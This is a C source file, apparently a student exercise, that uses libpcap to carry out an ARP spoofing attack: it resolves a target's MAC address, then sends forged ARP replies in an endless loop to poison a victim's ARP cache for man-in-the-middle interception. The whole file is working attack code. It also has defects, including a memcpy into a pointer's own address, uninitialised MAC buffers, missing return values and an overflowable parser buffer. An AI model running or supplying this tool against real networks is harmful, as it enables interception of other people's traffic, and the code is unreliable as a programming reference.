#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>

#define ETHER_HEADER_SIZE 14

typedef struct _ether_header{
        uint8_t         destination_mac_address[6];
        uint8_t         source_mac_address[6];
	uint16_t	type;

}ether_header;


typedef struct _arp_header{
	uint16_t	hardware_type;
	uint16_t	protocol_type;
	uint8_t		hardware_address_length;
	uint8_t		protocol_address_length;
	uint16_t	option;
	uint8_t		source_mac_address[6];
	uint8_t		source_ip_address[4];
	uint8_t         destination_mac_address[6];
        uint8_t         destination_ip_address[4];
}arp_header;

int arpAttack(pcap_t*, char*, char*);
int sendArp(pcap_t*, uint32_t, uint32_t, uint8_t*, uint8_t*,int);
void printE(ether_header);
void printA(arp_header);
uint32_t ipParser(char*);

int arpAttack(pcap_t* handle, char* sender_ip, char* target_ip ){
	printf("arpAttack function begin\n");
	uint8_t	sender_mac_address[6];
	uint8_t target_mac_address[6];
	unsigned char* buffer;
	uint32_t sender_ips, target_ips;

	sender_ips = ipParser(sender_ip);
	target_ips = ipParser(target_ip);

	sendArp(handle, target_ips, sender_ips, target_mac_address, sender_mac_address, 1);
	sendArp(handle, sender_ips, target_ips, sender_mac_address, target_mac_address, 0);

}

int sendArp(pcap_t* handle, uint32_t sender_ip, uint32_t target_ip,
	uint8_t*  source_mac_address, uint8_t* destination_mac_address, int type ){

	printf("sendArp function begin\n");
	ether_header ether;
        arp_header arp;
	
	struct	pcap_pkthdr*	header;
	const	u_char*		packet;

	unsigned char my_mac_address[6] = {0x00,0x0c,0x29,0xc2,0xbd,0xe9};
	unsigned char broadcast_mac_address[6] = {0Xff,0xff,0xff,0xff,0xff,0xff};



	if(type == 1){
		memcpy(ether.source_mac_address, my_mac_address, 6);
		memcpy(&source_mac_address, my_mac_address, 6);
	}
	else
                memcpy(ether.source_mac_address, source_mac_address, 6);

	if(type == 1)
		memcpy(ether.destination_mac_address, broadcast_mac_address, 6);
	else
                memcpy(ether.destination_mac_address, destination_mac_address, 6);

	ether.type = htons(0x0806);

	
	
	arp.hardware_type = htons(0x0001);
	arp.protocol_type = htons(0x0800);
	arp.hardware_address_length = 0x06;
	arp.protocol_address_length = 0x04;
	arp.option = htons(0x001);

	uint32_t sip = htonl(sender_ip);
	uint32_t tip = htonl(target_ip);	

	memcpy(arp.source_mac_address, ether.source_mac_address, 6);
	memcpy(arp.source_ip_address, &sip,4);
	memcpy(arp.destination_mac_address, ether.destination_mac_address, 6);
	memcpy(arp.destination_ip_address, &tip, 4);
	

	u_char buffer[42];
	memcpy(buffer, &ether, sizeof(ether_header));
	memcpy(&buffer[14], &arp, sizeof(arp_header));
	

	int res = pcap_sendpacket(handle, buffer, 42);

	if( type == 0){
		while(1){
			res = pcap_sendpacket(handle, buffer, 42);
			if(res == -1){
				fprintf(stderr, "fake arp packet failed\n");
				return;
			}
		}
	}

	if(res == -1){
		fprintf(stderr, "send arp packet failedi\n");
		return -1;
	}
	
	printf("\nsend arp packet\n\n");

	while(1){
		int res = pcap_next_ex(handle, &header, &packet);
	
		if(res == 0)
			continue;
		if(res == -1 || res == -2)
			break;
		
		memcpy(&ether, &packet[0], sizeof(ether_header));
		memcpy(&arp, &packet[14], sizeof(arp_header));

		if( type == 0 )
			return;

		if( memcmp(ether.destination_mac_address, &source_mac_address, 6) == 0 &&
			ntohs(ether.type) == 0x0806 &&
			memcmp(arp.destination_ip_address, &sip, 4) == 0 &&
			memcmp(arp.source_ip_address, &tip, 4) == 0)
		{
			memcpy(destination_mac_address, ether.source_mac_address, 6);
			printf("request detected!!\n");
			break;
		}
		else{
		    printf("%u bytes captured\n", header->caplen);
		}
	}

}


void printE(ether_header ether){
	int i;
	printf("\nprintE function begin\n");              
      	printf("source/destination MAC address: \n");
	for(i = 0; i<6; i++){
		if((unsigned char)ether.source_mac_address[i]<16)
			printf("%x", 0);
		printf("%x", ether.source_mac_address[i]);
                if(i!=5)
                	printf(":");
         }
         printf("\n");

  	 for(i = 0; i<6; i++){
		 if((unsigned char)ether.destination_mac_address[i]<16)
                        printf("%x", 0);
		 printf("%x", ether.destination_mac_address[i]);
		 if(i!=5)
			 printf(":");
	 }
	 printf("\n");
	 printf("ether type:\n");
	 printf("%x\n", ntohs(ether.type));

	 return;
}

void printA(arp_header arp){
	int i;
        printf("\nprintA function begin\n");
	printf("source/destination MAC address:\n");
        for(i = 0; i<6; i++){
                if((unsigned char)arp.source_mac_address[i]<16)
                        printf("%x", 0);
                printf("%x", arp.source_mac_address[i]);
                if(i!=5)
                        printf(":");
         }
         printf("\n");

         for(i = 0; i<6; i++){
                 if((unsigned char)arp.destination_mac_address[i]<16)
                        printf("%x", 0);
                 printf("%x", arp.destination_mac_address[i]);
                 if(i!=5)
                         printf(":");
         }
         printf("\n");

	 printf("source/destination IP address\n");
	 for(i = 0; i<4; i++){
		 printf("%d", arp.source_ip_address[i]);
		 if(i!=3)
			 printf(".");
	 }
	 printf("\n");

	
	 for(i = 0; i<4; i++){
                 printf("%d", arp.destination_ip_address[i]);
                 if(i!=3)
                         printf(".");
         }
         printf("\n");

	 
	 return;
}

uint32_t ipParser(char* str){
	printf("ipParser funtion begin\n");
	uint32_t result = 0;
	char buffer[4];
	int i, j = 0;

	for(i=0; i<strlen(str); i++){
		if(str[i] == '.' ){
			buffer[j] = '\0';
			result += atoi(buffer);
			result <<= 8;
			j = 0;
			continue;
		}
		buffer[j] = str[i];
		j++;
	}
	
	buffer[j] = '\0';
	result += atoi(buffer);

	return result;
}


int main(int argc, char* argv[]){
	
	if (argc != 4) {
		fprintf(stderr, "syntax: arp <interface> <sender ip> <target ip>\n");
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if ( handle == NULL) {
		fprintf(stderr, "coldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	
	arpAttack(handle, argv[2], argv[3]);


	return 0;
}
